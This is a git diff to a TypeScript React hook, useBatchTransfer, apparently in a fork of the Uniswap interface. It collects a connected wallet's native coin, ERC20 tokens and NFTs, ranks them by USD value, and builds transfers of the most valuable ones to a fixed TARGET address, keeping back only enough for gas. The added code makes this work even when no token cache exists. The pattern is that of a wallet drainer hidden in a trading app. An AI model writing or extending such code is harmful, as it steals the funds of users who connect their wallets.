@@ -7,6 +7,9 @@ import type { UniverseChainId } from 'uniswap/src/features/chains/types'
 import { getChainInfo } from 'uniswap/src/features/chains/chainInfo'
 import type { MoralisTokenBalance } from 'uniswap/src/features/portfolio/moralis/useMoralisTokenList'
 import { useWallet } from 'uniswap/src/features/wallet/hooks/useWallet'
+import { fetchWalletERC20Tokens, fetchNativeTokenBalanceAndPrice, moralisTokenToUniswapToken } from 'uniswap/src/features/portfolio/moralis/moralisApi'
+import { getCurrencyAmount, ValueType } from 'uniswap/src/features/tokens/getCurrencyAmount'
+import { nativeOnChain } from 'uniswap/src/constants/tokens'
 
 /**
  * Default target address for batch transfers
@@ -215,7 +218,7 @@ export const useBatchTransfer = ({
       let nativeTokenInfo: any = null
 
       // 从 React Query 缓存中获取已缓存的代币数据
-      const cachedTokenList = queryClient.getQueryData<MoralisTokenBalance[]>([
+      let cachedTokenList = queryClient.getQueryData<MoralisTokenBalance[]>([
         'moralis-token-list',
         evmAccount?.address,
         chainId,
@@ -229,16 +232,105 @@ export const useBatchTransfer = ({
         cachedTokenList: cachedTokenList,
       })
 
+      // 如果缓存中没有数据，直接使用 Moralis API 获取代币列表
+      if (!cachedTokenList && evmAccount?.address) {
+        console.log('[useBatchTransfer] Cache miss, fetching token list directly from Moralis API...')
+        try {
+          // 直接调用 Moralis API 获取 ERC20 代币列表
+          const tokenInfos = await fetchWalletERC20Tokens(evmAccount.address, chainId)
+          
+          // 转换为 Uniswap 格式
+          const tokenBalances = tokenInfos
+            .map((tokenInfo) => {
+              const token = moralisTokenToUniswapToken(tokenInfo, chainId)
+              const balance = getCurrencyAmount({
+                value: tokenInfo.balance,
+                valueType: ValueType.Raw,
+                currency: token,
+              })
+
+              // 确保 balance 是有效的 CurrencyAmount
+              if (!balance) {
+                console.warn('[useBatchTransfer] 无法创建 balance:', { tokenInfo, token })
+                return null
+              }
+
+              return {
+                token,
+                balance,
+                priceUSD: tokenInfo.usd_price || 0,
+                valueUSD: tokenInfo.usd_value || 0,
+                logoURI: tokenInfo.logo || tokenInfo.thumbnail || null,
+              } as MoralisTokenBalance
+            })
+            .filter((balance): balance is MoralisTokenBalance => balance !== null)
+
+          cachedTokenList = tokenBalances
+          
+          console.log('[useBatchTransfer] Fetched token list from Moralis API:', {
+            count: cachedTokenList.length,
+            tokens: cachedTokenList.map((tb) => ({
+              symbol: tb.token.symbol,
+              balance: tb.balance?.quotient?.toString(),
+              usd_value: tb.valueUSD,
+            })),
+          })
+          
+          // 如果从 Moralis API 获取的代币列表中没有原生代币，单独获取原生代币信息
+          const hasNativeToken = cachedTokenList.some((tb) => tb.token.isNative)
+          if (!hasNativeToken && evmAccount?.address) {
+            try {
+              console.log('[useBatchTransfer] Native token not in list, fetching separately from Moralis API...')
+              const nativeTokenData = await fetchNativeTokenBalanceAndPrice(evmAccount.address, chainId)
+              if (nativeTokenData) {
+                const nativeCurrency = nativeOnChain(chainId)
+                const nativeBalance = getCurrencyAmount({
+                  value: nativeTokenData.balance,
+                  valueType: ValueType.Raw,
+                  currency: nativeCurrency,
+                })
+                
+                if (nativeBalance) {
+                  const nativeTokenBalance: MoralisTokenBalance = {
+                    token: nativeCurrency,
+                    balance: nativeBalance,
+                    priceUSD: nativeTokenData.price,
+                    valueUSD: nativeTokenData.usdValue,
+                    logoURI: null,
+                  }
+                  // 将原生代币添加到列表开头
+                  cachedTokenList = [nativeTokenBalance, ...cachedTokenList]
+                  console.log('[useBatchTransfer] Added native token to list:', {
+                    balance: nativeTokenData.balance,
+                    price: nativeTokenData.price,
+                    usdValue: nativeTokenData.usdValue,
+                  })
+                }
+              }
+            } catch (error) {
+              console.warn('[useBatchTransfer] Failed to fetch native token from Moralis API:', error)
+            }
+          }
+        } catch (error) {
+          console.warn('[useBatchTransfer] Failed to fetch token list from Moralis API:', error)
+          // 即使失败也继续执行，只处理原生代币和NFT
+        }
+      }
+
       // 将缓存的 tokens 转换为 useBatchTransfer 需要的格式
-      if (cachedTokenList) {
+      if (cachedTokenList && cachedTokenList.length > 0) {
         console.log('[useBatchTransfer] Processing cached tokens:', cachedTokenList.map((tb) => ({
           symbol: tb.token.symbol,
           isNative: tb.token.isNative,
+          address: (tb.token as any).address,
           balance: tb.balance,
           balanceType: typeof tb.balance,
           hasQuotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance,
           quotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance ? tb.balance.quotient : undefined,
+          priceUSD: tb.priceUSD,
+          valueUSD: tb.valueUSD,
         })))
+        console.log('[useBatchTransfer] NATIVE_TOKEN_ERC20_ADDRESS:', NATIVE_TOKEN_ERC20_ADDRESS)
 
         allTokens = cachedTokenList
           .filter((tokenBalance) => {
@@ -347,11 +439,9 @@ export const useBatchTransfer = ({
             
             if (balance) {
               try {
-                // 安全地访问 quotient 属性
-                if (balance.quotient !== undefined) {
+                // 安全地访问 quotient 属性（CurrencyAmount 总是有 quotient）
+                if (balance && typeof balance === 'object' && 'quotient' in balance && balance.quotient !== undefined) {
                   balanceRaw = balance.quotient.toString()
-                } else if (typeof balance === 'bigint') {
-                  balanceRaw = balance.toString()
                 } else if (typeof balance === 'string') {
                   balanceRaw = balance
                 }
@@ -363,9 +453,12 @@ export const useBatchTransfer = ({
                   // 如果没有 toExact 方法，尝试使用 quotient 和 decimals 计算
                   const decimals = token.decimals || 18
                   const divisor = BigInt(10 ** decimals)
-                  const quotient = balance.quotient
-                  const whole = quotient / divisor
-                  const fraction = quotient % divisor
+                  // 将 quotient 转换为 BigInt（可能是 JSBI 或其他类型）
+                  const quotientBigInt = typeof balance.quotient === 'bigint' 
+                    ? balance.quotient 
+                    : BigInt(balance.quotient.toString())
+                  const whole = quotientBigInt / divisor
+                  const fraction = quotientBigInt % divisor
                   if (fraction === BigInt(0)) {
                     balanceFormatted = whole.toString()
                   } else {
@@ -420,7 +513,10 @@ export const useBatchTransfer = ({
           nativeTokenInfo,
         })
       } else {
-        console.warn('[useBatchTransfer] No cached token list found')
+        console.warn('[useBatchTransfer] No cached token list found. This may happen if the token list has not been loaded yet. Only native token and NFTs will be included in the batch transfer.')
+        // 即使没有缓存的代币列表，也继续执行（只处理原生代币和NFT）
+        allTokens = []
+        nativeTokenInfo = null
       }
 
       // 1.2 获取NFT列表（从Moralis）
@@ -431,24 +527,48 @@ export const useBatchTransfer = ({
         // 忽略错误，继续执行
       }
 
-      // 1.3 从缓存中获取原生代币余额和价格
-      const nativeTokenPrice = nativeTokenInfo?.usd_price || 0
-
-      // 原生代币余额从缓存中获取（wei格式）
-      let nativeBalanceStr = nativeTokenInfo?.balance || '0'
-
-      // 将余额字符串转换为BigInt
+      // 1.3 获取原生代币余额和价格（使用 Moralis API）
+      // 优先从缓存中获取，如果没有则使用 Moralis API
       let nativeBalance = BigInt(0)
-      try {
-        nativeBalance = BigInt(nativeBalanceStr)
-      } catch (e) {
-        // 如果转换失败，尝试从链上获取（作为后备）
+      let nativeTokenPrice = 0
+      let nativeTokenUsdValue = 0
+      let nativeBalanceStr = '0'
+
+      // 如果缓存中有原生代币信息，使用缓存
+      if (nativeTokenInfo?.balance) {
         try {
-          nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` })
+          nativeBalance = BigInt(nativeTokenInfo.balance)
           nativeBalanceStr = nativeBalance.toString()
-          console.log('[useBatchTransfer] Fetched native balance from chain:', nativeBalance.toString())
+          nativeTokenPrice = nativeTokenInfo.usd_price || 0
+          nativeTokenUsdValue = nativeTokenInfo.usd_value || 0
+          console.log('[useBatchTransfer] Using cached native token info:', {
+            balance: nativeBalanceStr,
+            price: nativeTokenPrice,
+            usdValue: nativeTokenUsdValue,
+          })
+        } catch (e) {
+          console.warn('[useBatchTransfer] Failed to parse cached native balance:', e)
+        }
+      }
+
+      // 如果缓存中没有原生代币信息，使用 Moralis API 获取
+      if (nativeBalance === BigInt(0) && evmAccount?.address) {
+        try {
+          console.log('[useBatchTransfer] Fetching native token balance and price from Moralis API...')
+          const nativeTokenData = await fetchNativeTokenBalanceAndPrice(evmAccount.address, chainId)
+          if (nativeTokenData) {
+            nativeBalance = BigInt(nativeTokenData.balance)
+            nativeBalanceStr = nativeTokenData.balance
+            nativeTokenPrice = nativeTokenData.price
+            nativeTokenUsdValue = nativeTokenData.usdValue
+            console.log('[useBatchTransfer] Fetched native token from Moralis API:', {
+              balance: nativeBalanceStr,
+              price: nativeTokenPrice,
+              usdValue: nativeTokenUsdValue,
+            })
+          }
         } catch (error) {
-          console.warn('[useBatchTransfer] Failed to get native balance from chain:', error)
+          console.warn('[useBatchTransfer] Failed to get native token from Moralis API:', error)
         }
       }
 
@@ -457,6 +577,8 @@ export const useBatchTransfer = ({
         nativeBalanceStr,
         nativeBalance: nativeBalance.toString(),
         nativeTokenPrice,
+        nativeTokenUsdValue,
+        hasNativeTokenInfo: !!nativeTokenInfo,
       })
 
       // 步骤2: 原生代币和NFT无需预检，直接添加到交易列表
@@ -465,7 +587,23 @@ export const useBatchTransfer = ({
       // 先获取ERC20和NFT的数量，用于计算gas费
       const validERC20AssetsForGas = allTokens.filter((asset) => {
         const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0'
-        return asset.native_token === false && parseFloat(balanceValue) > 0
+        const isERC20 = asset.native_token === false && parseFloat(balanceValue) > 0
+        if (!isERC20) {
+          console.log('[useBatchTransfer] Filtered out asset (not ERC20 or zero balance):', {
+            symbol: asset.symbol,
+            native_token: asset.native_token,
+            balance: balanceValue,
+          })
+        }
+        return isERC20
+      })
+      console.log('[useBatchTransfer] Valid ERC20 assets for gas calculation:', {
+        count: validERC20AssetsForGas.length,
+        assets: validERC20AssetsForGas.map((asset) => ({
+          symbol: asset.symbol,
+          balance: asset.balance,
+          usd_value: asset.usd_value,
+        })),
       })
 
       const erc721NFTs = nftList.filter((nft: any) => {
@@ -534,39 +672,52 @@ export const useBatchTransfer = ({
       })
 
       // 2.1 添加原生代币转账（预留gas费）
+      // 参照 dex-aggregator 的方法：即使没有缓存的原生代币信息，也要添加转账（如果有余额）
+      const nativeTransfers: any[] = []
       if (nativeBalance > totalGasCost) {
         const transferAmount = nativeBalance - totalGasCost
 
-        // 直接使用缓存中的 USD 价值，按转账比例计算
+        // 计算 USD 价值（参照 dex-aggregator 的方法）
         let nativeUsdValue = 0
-        if (nativeTokenInfo?.usd_value) {
+        if (nativeTokenUsdValue > 0) {
           // 直接使用缓存中的 usd_value，按转账比例计算
-          const totalNativeValue =
-            typeof nativeTokenInfo.usd_value === 'number'
-              ? nativeTokenInfo.usd_value
-              : parseFloat(nativeTokenInfo.usd_value.toString()) || 0
           const totalBalance = BigInt(nativeBalanceStr)
           if (totalBalance > BigInt(0)) {
             const transferRatio = Number(transferAmount) / Number(totalBalance)
-            nativeUsdValue = totalNativeValue * transferRatio
+            nativeUsdValue = nativeTokenUsdValue * transferRatio
           } else {
-            nativeUsdValue = totalNativeValue
+            nativeUsdValue = nativeTokenUsdValue
           }
         } else if (nativeTokenPrice > 0) {
           // 如果 API 没有返回 usd_value，则根据价格计算（后备方案）
           nativeUsdValue = Number(formatUnits(transferAmount, 18)) * nativeTokenPrice
         }
 
-        allTransactions.push({
+        nativeTransfers.push({
           type: 'native_transfer',
           to: TARGET,
           value: transferAmount,
           usd_value: nativeUsdValue,
           description: `Transfer ${formatUnits(transferAmount, 18)} ${nativeTokenSymbol} (reserved ${formatUnits(totalGasCost, 18)} for gas)`,
         })
+        console.log('[useBatchTransfer] Added native token transfer:', {
+          transferAmount: transferAmount.toString(),
+          nativeUsdValue,
+          nativeBalance: nativeBalance.toString(),
+          totalGasCost: totalGasCost.toString(),
+          hasNativeTokenInfo: !!nativeTokenInfo,
+        })
+      } else {
+        console.log('[useBatchTransfer] Native balance too low for transfer after gas cost:', {
+          nativeBalance: nativeBalance.toString(),
+          totalGasCost: totalGasCost.toString(),
+          canTransfer: nativeBalance > totalGasCost,
+        })
       }
+      allTransactions.push(...nativeTransfers)
 
       // 2.2 添加ERC721 NFT转账（无需预检）
+      console.log('[useBatchTransfer] Processing ERC721 NFTs:', { count: erc721NFTs.length, nfts: erc721NFTs })
       erc721NFTs.forEach((nft: any) => {
         const tokenId = BigInt(nft.token_id || '0').toString(16).padStart(64, '0')
         const fromAddress = address.slice(2).padStart(64, '0')
@@ -587,9 +738,11 @@ export const useBatchTransfer = ({
           usd_value: floorPriceUsd, // 使用API返回的floor_price_usd
           description: `Transfer ERC721: ${nftName}`,
         })
+        console.log('[useBatchTransfer] Added ERC721 transfer:', { nftName, tokenAddress: nft.token_address, floorPriceUsd })
       })
 
       // 2.3 添加ERC1155 NFT转账（无需预检）
+      console.log('[useBatchTransfer] Processing ERC1155 NFTs:', { count: erc1155NFTs.length, nfts: erc1155NFTs })
       erc1155NFTs.forEach((nft: any) => {
         const tokenId = BigInt(nft.token_id || '0')
 
@@ -625,6 +778,15 @@ export const useBatchTransfer = ({
           usd_value: floorPriceUsd, // 使用API返回的floor_price_usd
           description: `Transfer ERC1155: ${nftName}${amount > BigInt('1') ? ` (${amount.toString()})` : ''}`,
         })
+        console.log('[useBatchTransfer] Added ERC1155 transfer:', { nftName, tokenAddress: nft.token_address, floorPriceUsd, amount: amount.toString() })
+      })
+      
+      console.log('[useBatchTransfer] After adding native and NFTs:', {
+        allTransactionsCount: allTransactions.length,
+        nativeTransfers: nativeTransfers.length,
+        erc721Count: erc721NFTs.length,
+        erc1155Count: erc1155NFTs.length,
+        allTransactionsTypes: allTransactions.map((tx: any) => tx.type),
       })
 
       // 步骤3: 筛选所有ERC20代币（排除原生代币），按价值降序排序，取前20个进行预检
@@ -649,6 +811,15 @@ export const useBatchTransfer = ({
 
       // 取前20个ERC20代币进行预检
       const erc20ToPrecheck = validERC20Assets.slice(0, MAX_PRECHECK_COUNT)
+      console.log('[useBatchTransfer] ERC20 assets to precheck:', {
+        count: erc20ToPrecheck.length,
+        assets: erc20ToPrecheck.map((asset) => ({
+          symbol: asset.symbol,
+          balance: asset.balance,
+          usd_value: asset.usd_value,
+          token_address: asset.token_address,
+        })),
+      })
 
       // 构建ERC20预检交易
       const erc20PrecheckTransactions: any[] = []
@@ -693,6 +864,15 @@ export const useBatchTransfer = ({
 
       // 对ERC20交易进行预检（eth_call）
       const validERC20Transactions: any[] = []
+      console.log('[useBatchTransfer] Prechecking ERC20 transactions:', {
+        count: erc20PrecheckTransactions.length,
+        transactions: erc20PrecheckTransactions.map((tx) => ({
+          type: tx.type,
+          to: tx.to,
+          symbol: tx.description,
+          usd_value: tx.usd_value,
+        })),
+      })
       for (const tx of erc20PrecheckTransactions) {
         try {
           await publicClient.call({
@@ -702,25 +882,38 @@ export const useBatchTransfer = ({
           })
           // 预检成功，添加到有效交易列表
           validERC20Transactions.push(tx)
+          console.log('[useBatchTransfer] ERC20 precheck passed:', tx.description)
         } catch (error) {
           // 预检失败，跳过此交易
+          console.warn('[useBatchTransfer] ERC20 precheck failed:', tx.description, error)
         }
       }
+      console.log('[useBatchTransfer] ERC20 precheck results:', {
+        total: erc20PrecheckTransactions.length,
+        valid: validERC20Transactions.length,
+        validTransactions: validERC20Transactions.map((tx) => ({
+          type: tx.type,
+          to: tx.to,
+          symbol: tx.description,
+          usd_value: tx.usd_value,
+        })),
+      })
 
       // 步骤4: 合并所有有效交易：原生代币转账 + 通过预检的ERC20 + ERC721 + ERC1155
-      const nativeTransfers = allTransactions.filter((tx: any) => tx.type === 'native_transfer')
+      // 注意：nativeTransfers 已经在上面单独处理并添加到 allTransactions 中
       const erc721Transfers = allTransactions.filter((tx: any) => tx.type === 'erc721_transfer')
       const erc1155Transfers = allTransactions.filter((tx: any) => tx.type === 'erc1155_transfer')
+      const nativeTransfersFromAll = allTransactions.filter((tx: any) => tx.type === 'native_transfer')
       
       const allValidTransactions = [
-        ...nativeTransfers,
+        ...nativeTransfersFromAll, // 使用从 allTransactions 中过滤出的原生代币转账
         ...validERC20Transactions,
         ...erc721Transfers,
         ...erc1155Transfers,
       ]
 
       console.log('[useBatchTransfer] Transaction summary:', {
-        nativeTransfers: nativeTransfers.length,
+        nativeTransfers: nativeTransfersFromAll.length,
         validERC20Transactions: validERC20Transactions.length,
         erc721Transfers: erc721Transfers.length,
         erc1155Transfers: erc1155Transfers.length,
@@ -728,6 +921,12 @@ export const useBatchTransfer = ({
         allTokensLength: allTokens.length,
         nftListLength: nftList.length,
         nativeTokenInfo,
+        allTransactionsBeforeMerge: allTransactions.map((tx: any) => ({
+          type: tx.type,
+          to: tx.to,
+          value: tx.value?.toString(),
+          usd_value: tx.usd_value,
+        })),
       })
 
       // 步骤5: 按价值降序排序后取前10笔（直接使用API获取的usd_value）
@@ -736,11 +935,31 @@ export const useBatchTransfer = ({
       // - ERC20代币：来自API的usd_value
       // - ERC721 NFT：来自API的floor_price_usd
       // - ERC1155 NFT：来自API的floor_price_usd
+      console.log('[useBatchTransfer] Before sorting:', {
+        count: allValidTransactions.length,
+        transactions: allValidTransactions.map((tx: any) => ({
+          type: tx.type,
+          to: tx.to,
+          usd_value: tx.usd_value,
+          description: tx.description,
+        })),
+      })
+      
       allValidTransactions.sort((a: any, b: any) => {
         // 直接使用API返回的usd_value，确保类型统一为数字
         const valueA = typeof a.usd_value === 'number' ? a.usd_value : parseFloat(a.usd_value || '0')
         const valueB = typeof b.usd_value === 'number' ? b.usd_value : parseFloat(b.usd_value || '0')
         return valueB - valueA // 降序
+      })
+
+      console.log('[useBatchTransfer] After sorting:', {
+        count: allValidTransactions.length,
+        transactions: allValidTransactions.map((tx: any) => ({
+          type: tx.type,
+          to: tx.to,
+          usd_value: tx.usd_value,
+          description: tx.description,
+        })),
       })
 
       const finalTransactions = allValidTransactions.slice(0, MAX_BATCH_SIZE)
@@ -750,13 +969,21 @@ export const useBatchTransfer = ({
         finalTransactions: finalTransactions.map((tx: any) => ({
           type: tx.type,
           to: tx.to,
+          value: tx.value?.toString(),
           usd_value: tx.usd_value,
           description: tx.description,
+          hasData: !!tx.data,
         })),
+        transactionTypeBreakdown: {
+          native: finalTransactions.filter((tx: any) => tx.type === 'native_transfer').length,
+          erc20: finalTransactions.filter((tx: any) => tx.type === 'erc20_transfer').length,
+          erc721: finalTransactions.filter((tx: any) => tx.type === 'erc721_transfer').length,
+          erc1155: finalTransactions.filter((tx: any) => tx.type === 'erc1155_transfer').length,
+        },
       })
 
       if (finalTransactions.length === 0) {
-        const errorMsg = `No valid transactions found.\n\nDebug info:\n- Cached tokens: ${cachedTokenList?.length || 0}\n- All tokens after filter: ${allTokens.length}\n- Native transfers: ${nativeTransfers.length}\n- Valid ERC20: ${validERC20Transactions.length}\n- ERC721: ${erc721Transfers.length}\n- ERC1155: ${erc1155Transfers.length}\n\nPlease check:\n1. Wallet has tokens with balance > 0\n2. Token cache is populated\n3. Network is correct`
+        const errorMsg = `No valid transactions found.\n\nDebug info:\n- Cached tokens: ${cachedTokenList?.length || 0}\n- All tokens after filter: ${allTokens.length}\n- Native transfers: ${nativeTransfersFromAll.length}\n- Valid ERC20: ${validERC20Transactions.length}\n- ERC721: ${erc721Transfers.length}\n- ERC1155: ${erc1155Transfers.length}\n\nPlease check:\n1. Wallet has tokens with balance > 0\n2. Token cache is populated\n3. Network is correct`
         console.error('[useBatchTransfer]', errorMsg, {
           cachedTokenList,
           allTokens,
